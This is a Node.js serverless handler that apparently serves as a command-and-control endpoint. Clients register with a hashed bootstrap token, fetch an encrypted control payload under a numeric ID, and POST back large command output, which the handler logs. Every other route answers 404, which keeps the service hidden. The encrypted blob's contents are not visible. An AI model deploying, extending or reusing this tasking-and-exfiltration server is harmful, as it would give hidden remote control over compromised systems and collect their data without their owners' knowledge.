import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '13';
const CONTROL_PAYLOAD = 'U2FsdGVkX1+79CbZ6WklkcdkUW5KLh1Nxq4ewtRzPvWswXCwm2oCHeaErCqPQqY6cf9negQvb7VdE/RyU0eYH+FUcoGdJOP/ak4k6cbRM6CF/dggG+LmqFYoZOSEXAtHq56yN5iLpgQDRtsSc8DMDvyEQpSzJvRV9/HZduHK3yLeqV4NZ1mp/iLf8r/JgUerptf5hh28Dsln2yB38jmLsDT2P64Qr5w1YIY4cPOkc62oTMFYBEorsKWMFtdK47Lw7pVJMdRbDKWYzHKjnW9LoetFRY5oPXmWmk4prdSbKzmNOWIVltizfiDfydLh9lEoAgdO8993iMPKdr1hxXcKpUlJpinHMFc8++bDsACL8RU+Ai6qAL4jDol/9tQMZqOf1VqmLrLvYqRTWy11irY2Rsg7nkI1pak5Lr5XW2TtdIGUZouW69glGzGULJ/TEr9khvDcun9Ut0hRDCzMAMFVVDHWRpfWwOHPVq5IR+5E9JsW9RhdaE6I1agvYvqh6qZxMV7QN8a1RU6HR4l9xiAn+9oLsaqyPGL5Wrf/7VpDaeH3GpHRRfavaFuZH2e4K2oZpJTueRpXlHBtrxqPN9WNiVqtgMy/jmuFwewbGPKZ9q01JktHB/LacYttA5+IXNBpng68OG+OoW0JKCnXoP1inkEjrcezMPDtNpyOgvYwKvp8ttFIi6t3QCv/zB5BKMQIIOMrmUe4sPD3htpfSLFG/5zPsathVlmmdXzQdUE+q9glsrwWMQI5KsmMnVdn7XFA51MHgOfs26TTk3UHgXHcYZXkM0BSxJYqCUZVvM1hMaf8scbfH+d62ZEHUP2SxLcyq3UgO9+51QYXsQLby3gl2lkFBW/EozNtMCUWKa95CJEuhSTJpSpcuwsNq2THun5Z8rkvn9eqXCkv1QXdJCFEgqAABRqwDPbRP+b/TO9Wo60YcwRSb7YAKX4mlahoRElB';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}
function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}
export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_OUTPUT ${body.slice(0, 200000)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
